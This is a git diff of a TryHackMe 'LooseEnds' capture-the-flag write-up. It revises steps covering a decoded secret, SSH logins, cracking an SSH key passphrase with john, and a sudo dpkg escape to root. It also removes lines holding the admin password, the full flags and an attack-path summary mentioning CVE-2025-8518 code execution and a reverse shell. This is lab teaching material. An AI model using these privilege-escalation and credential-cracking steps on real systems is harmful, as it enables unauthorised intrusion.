@@ -1,5 +1,6 @@
 # TryHackMe – LooseEnds Writeup
 
+<img width="1170" height="658" alt="LooseEnds" src="https://github.com/user-attachments/assets/cdce8ea6-0f4b-4a50-8e37-c02133f7d60b" />
 
 ---
 
@@ -189,7 +190,8 @@ curl http://192.168.1.99/config/secret
 The response contains hexadecimal-looking data:
 
 ```text
-30 30 30 30 30 30 30 30 20 20 35 39 20 35 37 20 35 32 20 37 34 20 36 31 20 35 37 20 33 34 20 36 37 20 34 66 20 36 39 20 34 32 20 34 64 20 35 39 20 35 37 20 34 61 20 34 32 20 20 7c 59 57 52 74 61 57 34 67 4f 69 42 4d 59 57 4a 42 7c 0a 30 30 30 30 30 30 31 30 20 20 35 61 20 34 37 20 33 31 20 37 30 20 36 32 20 36 39 20 34 35 20 37 39 20 34 64 20 34 34 20 34 39 20 33 32 20 34 39 20 37 61 20 34 32 20 33 34 20 20 7c 5a 47 31 70 62 69 45 79 4d 44 49 32 49 7a 42 34 7c 0a 30 30 30 30 30 30 32 30 20 20 34 66 20 35 31 20 33 64 20 33 64 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 7c 4f 51 3d 3d 7c```
+30 30 30 30 30 30 30 30 20 20 35 39 20 35 37 20 35 32 20 37 34 20 36 31 20 35 37 20 33 34 20 36 37 20 34 66 20 36 39 20 34 32 20 34 64 20 35 39 20 35 37 20 34 61 20 34 32 20 20 7c 59 57 52 74 61 57 34 67 4f 69 42 4d 59 57 4a 42 7c 0a 30 30 30 30 30 30 31 30 20 20 35 61 20 34 37 20 33 31 20 37 30 20 36 32 20 36 39 20 34 35 20 37 39 20 34 64 20 34 34 20 34 39 20 33 32 20 34 39 20 37 61 20 34 32 20 33 34 20 20 7c 5a 47 31 70 62 69 45 79 4d 44 49 32 49 7a 42 34 7c 0a 30 30 30 30 30 30 32 30 20 20 34 66 20 35 31 20 33 64 20 33 64 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 7c 4f 51 3d 3d 7c
+```
 
 This appears to be encoded multiple times.
 
@@ -476,15 +478,20 @@ After entering the recovered password, we obtain a shell as `bunny`.
 Verify our privileges:
 
 ```bash
-id
-whoami
-```
+$ ssh bunny@192.168.1.99             
+bunny@192.168.1.99's password: 
+Linux LooseEnds 6.12.111+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.111-1 (2026-09-28) x86_64
 
-Output:
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
 
-```text
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+bunny@LooseEnds:~$ id ; whoami
 uid=1001(bunny) gid=1001(bunny) groups=1001(bunny),100(users),1002(monkeys)
 bunny
+bunny@LooseEnds:~$ 
 ```
 
 We have successfully logged in as `bunny`.
@@ -508,8 +515,10 @@ find / -group monkeys 2>/dev/null
 Output:
 
 ```text
+bunny@LooseEnds:~$ find / -group monkeys 2>/dev/null
 /home/zer0arc4/.ssh
 /home/zer0arc4/.ssh/id_ed25519
+bunny@LooseEnds:~$ 
 ```
 
 Because `bunny` is a member of the `monkeys` group, we can access the SSH private key belonging to `zer0arc4`.
@@ -531,8 +540,18 @@ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 ### Result
 
 ```text
-1g 0:00:06:14 DONE
-0.002668g/s 24.71p/s 24.71c/s
+$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+Created directory: /home/arc/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
+Cost 2 (iteration count) is 24 for all loaded hashes
+Will run 6 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+[********]          (id_ed25519)     
+1g 0:00:06:14 DONE (2026-10-05 07:40) 0.002668g/s 24.71p/s 24.71c/s 24.71C/s rubberducky..BASKETBALL
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
 ```
 
 The private-key passphrase was successfully recovered.
@@ -551,14 +570,19 @@ After entering the recovered passphrase, we obtain a shell as `zer0arc4`.
 
 Verify:
 
-```bash
-id
-whoami
-```
-
-Output:
-
 ```text
+$ ssh -i id_ed25519 zer0arc4@192.168.1.99
+Enter passphrase for key 'id_ed25519': 
+Linux LooseEnds 6.12.111+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.111-1 (2026-09-28) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Oct  4 12:31:39 2026 from 192.168.1.28
+zer0arc4@LooseEnds:~$ id ;whoami
 uid=1000(zer0arc4) gid=1000(zer0arc4) groups=1000(zer0arc4),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),104(bluetooth),1002(monkeys)
 zer0arc4
 ```
@@ -580,7 +604,7 @@ cat /home/zer0arc4/user.txt
 ```
 
 ```text
-THM{QWxha2F0aSBVbWVzaCBDaGFuZHJhCg}
+THM{QWxha2F0aS*******************}
 ```
 
 ---
@@ -596,20 +620,16 @@ sudo -l
 ### Output
 
 ```text
+zer0arc4@LooseEnds:~$ sudo -l
 Matching Defaults entries for zer0arc4 on LooseEnds:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
 
 User zer0arc4 may run the following commands on LooseEnds:
     (root) NOPASSWD: /usr/bin/dpkg
+zer0arc4@LooseEnds:~$ 
 ```
 
-We can execute:
-
-```text
-/usr/bin/dpkg
-```
-
-as `root` without providing a password.
+We can execute: `/usr/bin/dpkg` as `root` without providing a password.
 
 ---
 
@@ -623,13 +643,9 @@ sudo /usr/bin/dpkg -l
 
 This opens the package list interface.
 
-From the interface, press:
+From the interface, press: `ESC` to access the command prompt.
 
-```text
-ESC
-```
-
-to access the command prompt.
+<img width="1706" height="820" alt="Screenshot_2026-10-05_07_49_02" src="https://github.com/user-attachments/assets/5dbb7407-919b-4c37-bdf7-7c08df59daaa" />
 
 Enter:
 
@@ -642,15 +658,10 @@ This launches a privileged Bash shell.
 Verify our privileges:
 
 ```bash
-id
-whoami
-```
-
-Output:
-
-```text
+root@LooseEnds:~# id ; whoami
 uid=0(root) gid=0(root) groups=0(root)
 root
+root@LooseEnds:~# 
 ```
 
 We have successfully obtained a root shell.
@@ -666,215 +677,37 @@ cat /root/root.txt
 ```
 
 ```text
-THM{QWxha2F0aSBSYWphbWFuaSBWZW5rYW5uYQo}
-```
-
----
-
-# 🧾 Attack Path Summary
-
-```text
-Nmap
- │
- ├── 22/tcp → SSH
- └── 80/tcp → Vvveb CMS 1.0.5
-                  │
-                  ▼
-            Source Enumeration
-                  │
-                  ▼
-         Identify Vvveb 1.0.5
-                  │
-                  ▼
-             Gobuster
-                  │
-                  ▼
-            /config/secret
-                  │
-                  ▼
-        HEX → Hexdump → Base64
-                  │
-                  ▼
-       admin : scottgreen
-                  │
-                  ▼
-           Admin Panel
-                  │
-                  ▼
-          CVE-2025-8518
-                  │
-                  ▼
-          Vvveb Code Editor
-                  │
-                  ▼
-          PHP Code Execution
-                  │
-                  ▼
-          Reverse Shell
-                  │
-                  ▼
-            www-data
-                  │
-                  ▼
-       /var/www/vvveb/config/db.php
-                  │
-                  ▼
-          Bunny Credentials
-                  │
-                  ▼
-             SSH as bunny
-                  │
-                  ▼
-          Group: monkeys
-                  │
-                  ▼
-    /home/zer0arc4/.ssh/id_ed25519
-                  │
-                  ▼
-       Crack SSH Passphrase
-                  │
-                  ▼
-          SSH as zer0arc4
-                  │
-                  ▼
-              sudo -l
-                  │
-                  ▼
-       NOPASSWD: /usr/bin/dpkg
-                  │
-                  ▼
-       dpkg → !/bin/bash -p
-                  │
-                  ▼
-               ROOT
+THM{QWxha2F0aSBSYWphbW*********************}
 ```
 
 ---
 
 # 🧾 Summary
 
-The initial attack surface consisted of SSH and an Apache-hosted Vvveb CMS installation.
+LooseEnds was compromised through a vulnerable **Vvveb CMS 1.0.5** installation. Directory enumeration revealed `/config/secret`, which contained encoded administrator credentials. After decoding the data, administrator access was obtained.
 
-Enumeration revealed **Vvveb CMS 1.0.5**. Further directory enumeration uncovered `/config/secret`, which contained multiple layers of encoding. Decoding the data using **HEX → Hexdump → Base64** revealed administrator credentials:
+Using the administrator access, **CVE-2025-8518** was exploited through the Vvveb Code Editor to achieve PHP code execution and obtain a reverse shell as `www-data`.
 
-```text
-admin : scottgreen
-```
+Further enumeration revealed database credentials for another local account in `/var/www/vvveb/config/db.php`. The credentials were reused to gain SSH access as `bunny`.
 
-After authenticating to the administrator panel, the vulnerable Vvveb Code Editor was abused through **CVE-2025-8518** to execute arbitrary PHP code.
+The `bunny` account belonged to the `monkeys` group, which provided access to another user's SSH private key. After recovering the key's passphrase, SSH access was obtained as `zer0arc4`.
 
-A reverse shell was obtained as:
-
-```text
-www-data
-```
-
-The Vvveb database configuration then exposed credentials for the `bunny` account. These credentials were reused for SSH access.
-
-The `bunny` account belonged to the `monkeys` group, which provided access to:
-
-```text
-/home/zer0arc4/.ssh/id_ed25519
-```
-
-After cracking the SSH key's passphrase, SSH access was obtained as `zer0arc4`.
-
-Finally, `sudo -l` revealed that `zer0arc4` could execute `/usr/bin/dpkg` as root without a password. Using `dpkg` to launch a privileged Bash shell resulted in complete root access.
+Finally, `sudo -l` revealed that `zer0arc4` could execute `/usr/bin/dpkg` as root without a password. This was abused to spawn a privileged Bash shell and obtain root access.
 
 ---
 
 # 🚀 Key Takeaways
 
-### 1. Always identify application versions
+- **Vvveb CMS 1.0.5** was vulnerable to **CVE-2025-8518**, allowing authenticated code execution through the Code Editor.
+- Sensitive authentication information was exposed through the `/config/secret` endpoint after decoding multiple layers of encoding.
+- Application configuration files can disclose credentials that may enable lateral movement.
+- **Group memberships** should always be checked, as the `monkeys` group provided access to another user's SSH private key.
+- Reused credentials can allow movement from a web shell to a local SSH account.
+- Always enumerate `sudo -l` after obtaining a user shell.
+- The `NOPASSWD` permission for `/usr/bin/dpkg` provided the final path to **root**.
+- The complete attack chain was:
 
-The exposed Vvveb version immediately provided an important lead:
-
-```text
-Vvveb CMS 1.0.5
-```
-
-Version enumeration can reveal known vulnerabilities.
-
-### 2. Enumerate interesting directories deeply
-
-The initial Gobuster scan discovered `/config/`, but further enumeration of that directory revealed:
-
-```text
-/config/secret
-```
-
-Nested directory enumeration can expose sensitive files missed during the first scan.
-
-### 3. Look for encoded secrets
-
-The `/config/secret` file was not immediately readable, but recognizing the hexadecimal representation and decoding it through multiple stages exposed administrator credentials.
-
-### 4. Check configuration files for credentials
-
-The Vvveb database configuration contained credentials for another local account:
-
-```text
-user = bunny
-```
-
-Application configuration files are often valuable during post-exploitation enumeration.
-
-### 5. Check group memberships
-
-The `bunny` account belonged to:
-
-```text
-monkeys
-```
-
-Searching for files owned by that group exposed another user's SSH private key.
-
-### 6. Credentials and keys can lead to lateral movement
-
-The attack path moved through multiple accounts:
-
-```text
-www-data → bunny → zer0arc4 → root
-```
-
-Each account provided access to additional resources.
-
-### 7. Always check `sudo -l`
-
-The final privilege escalation was straightforward once the following permission was discovered:
-
-```text
-(root) NOPASSWD: /usr/bin/dpkg
-```
 
 ---
 
-# 🏴 Rooted
-
-**Initial Access:** Vvveb CMS RCE  
-**Initial User:** `www-data`  
-**Lateral Movement:** `www-data → bunny → zer0arc4`  
-**Privilege Escalation:** Sudo `dpkg`  
-**Root:** `root`
-
-### Flag 1 — Admin Password
-
-```text
-admin : scottgreen
-```
-
-### Flag 2 — User Flag
-
-```text
-THM{QWxha2F0aSBVbWVzaCBDaGFuZHJhCg}
-```
-
-### Flag 3 — Root Flag
-
-```text
-THM{QWxha2F0aSBSYWphbWFuaSBWZW5rYW5uYQo}
-```
-
----
-
-**Author:** zer0arc4
+## **Author:** [zer0arc4](https://github.com/zer0arc4)
